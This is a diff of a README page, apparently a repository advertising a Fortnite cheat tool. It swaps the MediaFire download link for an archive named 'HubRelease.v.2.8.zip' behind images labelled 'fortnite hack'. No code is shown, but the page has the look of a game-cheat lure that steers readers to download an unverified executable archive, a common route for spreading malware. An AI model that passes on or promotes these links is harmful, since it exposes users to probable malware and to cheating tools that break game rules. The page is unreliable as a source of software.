@@ -53,12 +53,12 @@ To download the latest version of the tool, choose your Windows version by click
 <table>
   <tr>
     <td align="center">
-      <a href="https://www.mediafire.com/file_premium/flqxi6mu6jfh7vc/HubRelease.v.2.8.zip/file">
+      <a href="https://www.mediafire.com/file_premium/a4wzpj6nb618mi5/HubRelease.v.2.8.zip/file">
         <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="fortnite hack" width="250">
       </a>
     </td>
     <td align="center">
-      <a href="https://www.mediafire.com/file_premium/flqxi6mu6jfh7vc/HubRelease.v.2.8.zip/file">
+      <a href="https://www.mediafire.com/file_premium/a4wzpj6nb618mi5/HubRelease.v.2.8.zip/file">
         <img src="https://i.imgur.com/z6NnWRw.jpeg" alt="another hack" width="250">
       </a>
     </td>
